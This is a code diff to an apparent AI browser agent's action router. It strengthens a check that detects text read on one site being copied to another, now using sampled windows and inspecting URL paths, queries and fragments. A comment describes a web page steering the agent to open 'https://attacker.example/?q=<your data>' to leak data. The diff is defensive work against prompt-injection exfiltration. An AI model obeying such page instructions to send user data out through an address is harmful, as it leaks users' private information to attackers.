@@ -28,8 +28,25 @@ export interface RouterOptions {
 
 /** Text the assistant read on each site this request, to spot it being carried to another site. */
 const CORPUS_LIMIT = 200_000;
-const TAINT_MIN_CHARS = 24;
+/**
+ * Text counts as carried from another source when it shares a run of at least TAINT_WINDOW characters with what
+ * was read there. Windows are sampled every TAINT_STRIDE characters, so any shared run of TAINT_WINDOW + TAINT_STRIDE
+ * characters or more is always caught, even inside padding added around it.
+ */
+const TAINT_WINDOW = 24;
+const TAINT_STRIDE = 8;
 const norm = (text: string) => text.replace(/\s+/g, " ").trim().toLowerCase();
+const safeDecode = (s: string) => { try { return decodeURIComponent(s); } catch { return s; } };
+/** The parts of an address that can carry data: path, query values and fragment, decoded. The host is excluded. */
+export function urlText(raw: unknown): string {
+  try {
+    const url = new URL(String(raw));
+    const parts = [safeDecode(url.pathname)];
+    url.searchParams.forEach((value, key) => parts.push(key, value));
+    if (url.hash) parts.push(safeDecode(url.hash.slice(1)));
+    return parts.join(" ");
+  } catch { return ""; }
+}
 const hostOf = (url: unknown) => { try { return new URL(String(url)).hostname.replace(/^www\./, ""); } catch { return ""; } };
 /** "app:com.apple.mail" → "the app com.apple.mail"; websites stay as their host. */
 const sourceName = (key: string) => key.startsWith("app:") ? `the app ${key.slice(4)}` : key;
@@ -63,8 +80,11 @@ export function createAgentRouter(options: RouterOptions) {
   /** Hosts other than `host` whose pages contain `text`. */
   const carriedFrom = (text: string, host: string) => {
     const needle = norm(text);
-    if (needle.length < TAINT_MIN_CHARS) return [];
-    return [...corpus].filter(([h, body]) => h !== host && body.includes(needle)).map(([h]) => h);
+    if (needle.length < TAINT_WINDOW) return [];
+    const windows: string[] = [];
+    for (let i = 0; i + TAINT_WINDOW <= needle.length; i += TAINT_STRIDE) windows.push(needle.slice(i, i + TAINT_WINDOW));
+    windows.push(needle.slice(-TAINT_WINDOW));
+    return [...corpus].filter(([h, body]) => h !== host && windows.some(w => body.includes(w))).map(([h]) => h);
   };
 
   const withinRate = (host: string, count: number) => {
@@ -155,6 +175,11 @@ export function createAgentRouter(options: RouterOptions) {
         if (s.action !== "type" || !s.text) continue;
         const sources = carriedFrom(String(s.text), host);
         if (sources.length) gates.push(`This copies text read on ${sources.map(sourceName).join(", ")} into ${host || "another site"}.`);
+      }
+      // An address can carry data too: a page could steer the agent to open https://attacker.example/?q=<your data>.
+      if (name === "browser_open") {
+        const sources = carriedFrom(urlText(args.url), host);
+        if (sources.length) gates.push(`This opens ${host || "a website"} with text read on ${sources.map(sourceName).join(", ")} in its address.`);
       }
       tier = raise(tier, gates.length ? 2 : 0);
 
